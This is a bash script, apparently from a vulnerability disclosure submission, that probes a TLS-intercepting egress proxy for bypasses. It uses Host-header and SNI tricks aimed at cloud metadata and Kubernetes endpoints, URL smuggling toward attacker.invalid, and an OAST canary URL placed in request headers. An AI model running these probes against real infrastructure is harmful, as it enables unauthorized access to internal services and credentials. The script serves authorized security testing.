#!/usr/bin/env bash
# proxybypass_intercept_bypass.sh — H2: TLS interception + route-manifest bypass (CodeRabbit VDP).
# READ-ONLY: status-code probes only. Values redacted at source (4ch+len).
# Tests: Host-header override, absolute-URI, SNI mismatch, route-manifest smuggling,
#        credential-bearing SSRF (OAST canary).
echo "INTERCEPT_BYPASS_START"
echo "TS_UTC: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "SCRIPT_SHA256: $( (sha256sum "$0" 2>/dev/null || shasum -a 256 "$0") | awk '{print $1}')"

# --- helper: status-code probe with header capture ---
# $1=label, $2+=curl args (URL last)
probe() {
  local label="$1"; shift
  local hdr="/tmp/_hdrs_ib_$$" code rc
  code=$(curl -sS -m 12 -o /dev/null -D "$hdr" -w '%{http_code}' "$@" 2>/dev/null); rc=$?
  echo "$label -> code=${code:-000} rc=$rc"
  if [ -f "$hdr" ]; then
    grep -iE '^(Via|Age|X-Cache|X-Proxy|Proxy-Auth|X-Forwarded|Server|CF-RAY|X-Served-By)' "$hdr" 2>/dev/null | \
      sed -E 's/^(.+):(.)/\1: <REDACTED>/' | head -6
    rm -f "$hdr"
  fi
}

# --- H2a: Host-header override to internal name while connecting to allow-listed host ---
echo "== H2a_host_header_override =="
probe "host_internal_on_github"   -H "Host: internal" "https://api.github.com/"
probe "host_internal_on_example"  -H "Host: internal" "https://example.com/"
probe "host_metadata_on_github"   -H "Host: metadata.google.internal" "https://api.github.com/"
probe "host_kubernetes_on_github" -H "Host: kubernetes.default.svc" "https://api.github.com/"
probe "host_control"              "https://api.github.com/"

# --- H2b: absolute-URI request-target (raw forward-proxy shape) ---
echo "== H2b_absolute_uri =="
probe "absuri_internal_http"  "http://internal/"
probe "absuri_internal_https" "https://internal/"

# --- H2c: SNI mismatch (connect to allow-listed host with different SNI) ---
echo "== H2c_sni_mismatch =="
GHIP=$(dig +short api.github.com 2>/dev/null | grep -E '^[0-9]+\.' | head -1)
if [ -n "$GHIP" ]; then
  echo "GHIP_PREFIX=${GHIP:0:4}...[REDACTED len=${#GHIP}]"
  probe "sni_internal_on_ghip"      --resolve "internal:443:$GHIP" "https://internal/"
  probe "sni_metadata_on_ghip"      --resolve "metadata.google.internal:443:$GHIP" "https://metadata.google.internal/"
  probe "sni_kubernetes_on_ghip"    --resolve "kubernetes.default.svc:443:$GHIP" "https://kubernetes.default.svc/"
else
  echo "GHIP=RESOLUTION_FAILED (dig not available or no A record)"
fi

# --- H2d: Route-manifest smuggling (userinfo/host/port confusion) ---
echo "== H2d_manifest_smuggling =="
probe "smuggle_userinfo_at"     "https://api.github.com@attacker.invalid/"
probe "smuggle_port_at"         "https://api.github.com:443@attacker.invalid/"
probe "smuggle_case_upper"      "https://API.GITHUB.COM/"
probe "smuggle_trailing_dot"    "https://api.github.com./"
probe "smuggle_pct_encoded"     "https://api%2egithub%2ecom/"

# --- H2e: OAST canary (catch credential-bearing SSRF) ---
echo "== H2e_oast_canary =="
# Canary tokens — if the server fetches these URLs with injected creds, we catch it.
# Use a unique canary path that we can poll later.
OAST="https://canarytokens.com/about/d341p0a3wjn1b4av13fzm318o/index.html"
echo "OAST_URL=$OAST"
probe "oast_referer_github"     -H "Referer: $OAST" "https://api.github.com/"
probe "oast_xff_github"         -H "X-Forwarded-For: $OAST" "https://api.github.com/"
probe "oast_ua_github"          -A "Mozilla/5.0 $OAST" "https://api.github.com/"

echo "INTERCEPT_BYPASS_END"